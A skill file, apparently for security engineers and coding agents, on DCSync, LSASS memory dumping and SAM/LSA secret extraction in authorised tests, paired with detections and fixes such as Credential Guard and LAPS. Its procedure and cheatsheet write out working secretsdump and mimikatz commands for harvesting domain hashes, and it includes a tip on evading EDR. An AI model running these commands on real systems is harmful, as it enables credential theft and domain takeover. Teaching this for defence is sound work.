---
format: "v2"
name: "dcsync-and-credential-dumping"
title: "Dcsync And Credential Dumping"
title_fr: "DCSync et vol d'identifiants"
description: "Use when demonstrating how domain and host credentials get harvested — DCSync, LSASS dumping, and cached secrets — and the controls and detections that stop it."
description_fr: "À utiliser pour démontrer comment les identifiants du domaine et des postes sont récoltés — DCSync, dump de LSASS, secrets en cache — ainsi que les contrôles et détections qui les stoppent."
domain: "12-active-directory-and-windows-security"
tags: [cybersecurity, engineering, best-practices]
maturity: "stable"
audience: ["backend-engineer", "security-engineer", "coding-agent"]
requires: ["bash", "git"]
updated: "2026-08-08"
---



## Prerequisites
- Target system, dependencies and environment configured.

## Usage
### Purpose

Once an attacker has enough rights, they stop guessing passwords and start stealing them wholesale. DCSync pulls password hashes straight from a domain controller by pretending to be one; LSASS dumping pulls credentials out of memory on any host. Either yields hashes an attacker can crack or pass. This skill covers the techniques (from the tester's side), and — the important half — how to prevent and detect them.

### When to use it

Late-stage internal engagements, after you've obtained the necessary rights (via BloodHound-identified paths, relay, or local admin). It demonstrates the impact of a compromise and validates whether the org can detect credential theft.

Authorised engagements only, and handle any recovered hashes as sensitive data under the rules of engagement.

### Procedure

1. **DCSync — pull hashes from the DC.** It requires replication rights (`GetChanges`/`GetChangesAll`), which BloodHound flags. With them, request the directory's secrets remotely, no code on the DC:
   ```
   secretsdump.py domain/user:pass@dc-ip
   # or targeted, from a Windows foothold:
   mimikatz # lsadump::dcsync /domain:corp.local /user:krbtgt
   ```
   Pulling the **krbtgt** hash is the worst case — it enables Golden Tickets (domain persistence).
2. **LSASS dumping — credentials from host memory.** On a host where you're admin, LSASS holds credentials of logged-on users. Dump and parse it offline to avoid touching it live with known tools:
   ```
   # acquire the dump (many methods); then parse offline:
   mimikatz # sekurlsa::minidump lsass.dmp
   mimikatz # sekurlsa::logonpasswords
   ```
3. **Cached and stored secrets.** Pull local SAM, cached domain credentials, and LSA secrets from a host:
   ```
   secretsdump.py -sam sam.hive -system system.hive LOCAL
   ```
4. **Assess reach.** Which accounts did you recover, and what do they unlock? A dumped Domain Admin or krbtgt is domain-wide; a local admin hash may enable lateral movement via pass-the-hash.
5. Report the exact accounts, method, and what each enables — that drives the remediation priority (rotate krbtgt twice, reset exposed accounts, close the rights that allowed DCSync).

### Cheatsheet

```bash
secretsdump.py corp.local/user:pass@10.0.0.1          # remote, all hashes
mimikatz: lsadump::dcsync /user:krbtgt                 # targeted

mimikatz: sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords

secretsdump.py -sam sam -system system LOCAL
reg save HKLM\SAM sam & reg save HKLM\SYSTEM system

BloodHound query: "Find Principals with DCSync Rights"
```

### Reading the output

- **krbtgt hash recovered** = worst case; it enables Golden Tickets and long-term domain persistence. Rotate it (twice) as top priority.
- **Domain Admin / privileged hashes** = domain-wide compromise; every recovered privileged account is a full reset.
- **Local admin hash reused across hosts** = pass-the-hash lateral movement; a shared local admin password turns one host into many.
- **DCSync succeeding at all** = some non-DC principal holds replication rights it shouldn't — that misconfiguration is the root cause to fix.
- **Cleartext creds in LSASS** (older/misconfigured hosts, WDigest) = immediate password exposure; a sign protections aren't in place.

### The fix

- **Restrict replication rights** (`GetChanges`/`GetChangesAll`) to actual domain controllers — removing them from stray accounts kills the DCSync path.
- **Protect LSASS**: enable **Credential Guard** and **LSA Protection (RunAsPPL)**, disable **WDigest** (no cleartext in memory), and keep local admin off the box where possible.
- **Unique local admin passwords** via LAPS so one dumped hash doesn't unlock the fleet; this breaks pass-the-hash lateral movement.
- **Tier administration** so privileged credentials never sit in memory on low-trust hosts (the credential-theft chain BloodHound visualises).
- **Detect it**: alert on DCSync-like replication requests from non-DC IPs (directory replication events), on LSASS access by unusual processes, and on krbtgt usage anomalies. Feed these to detection engineering.
- After any suspected compromise, **rotate krbtgt twice** and reset exposed accounts.

### Pitfalls

- **Parsing LSASS live with a flagged tool.** EDR catches known credential-dumpers touching LSASS; acquire the dump and parse offline where the engagement allows, and expect detection to fire (which is the point on a defensive test).
- **Forgetting DCSync leaves a trace.** It generates replication events from a non-DC source — a strong detection opportunity often left unmonitored.
- **Fixing dumped accounts but not the rights.** Reset the exposed passwords *and* remove the replication rights that allowed DCSync, or it recurs.
- **Ignoring krbtgt.** Reset exposed users but leave krbtgt, and Golden Ticket persistence survives the cleanup.

### References

- MITRE ATT&CK — T1003 (OS Credential Dumping), T1003.006 (DCSync)
- Microsoft — Credential Guard, LSA Protection, LAPS documentation
- Impacket secretsdump and mimikatz documentation

## Inputs
- Relevant source code, logs, network traces, or system specifications.

## Outputs
- Analysis findings, security audit report, or generated code artifacts.